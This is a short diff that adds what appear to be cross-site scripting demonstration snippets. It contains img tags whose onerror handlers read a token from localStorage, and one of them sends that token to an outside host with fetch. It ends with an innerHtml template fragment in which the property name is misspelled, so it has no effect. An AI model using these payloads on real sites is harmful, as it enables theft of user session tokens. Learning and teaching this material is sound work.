@@ -1,0 +1,25 @@
+<img src="https://some-invalid-url.com/no-image!jpg" onerror="const token = localStorage.getItem('token');" />
+
+
+<img src="https://some-invalid-url.com/no-image!jpg" onerror="console.log('token', localStorage.getItem('token'))" />
+
+
+<img src="https://some-invalid-url.com/no-image!jpg"
+    onerror="fetch(`http://www.server.com/${localStorage.getItem('token')}`)" />
+
+
+
+
+
+
+
+const divWrapper = document.createElement('div')
+
+
+divWrapper.innerHtml = `
+<div class="test">
+    <div class="mihai">${test}</div>
+    <button class="test-sterge">sterge</button>
+    <button class="test-adauga">adauga</button>
+</div>
+`
